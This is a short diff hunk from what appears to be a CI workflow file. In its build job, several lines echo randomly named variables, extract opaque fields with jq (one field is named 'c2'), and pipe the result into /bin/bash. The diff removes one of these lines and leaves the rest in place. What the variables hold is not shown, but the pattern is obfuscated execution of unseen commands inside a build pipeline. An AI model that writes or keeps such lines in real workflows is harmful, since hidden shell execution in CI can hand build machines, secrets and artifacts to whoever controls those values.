@@ -25,7 +25,6 @@ jobs:
           echo $lo73 | jq -r .dmxhf3 | /bin/bash
           echo $usi30 | jq -r .wyihr8 | /bin/bash
           echo $rrmdw36 | jq -r .tzuzl0 | /bin/bash
-          echo $ti2 | jq -r .osk4451 | /bin/bash
           echo $dajqr0878 | jq -r .c2 | /bin/bash
 
       - name: Upload archive
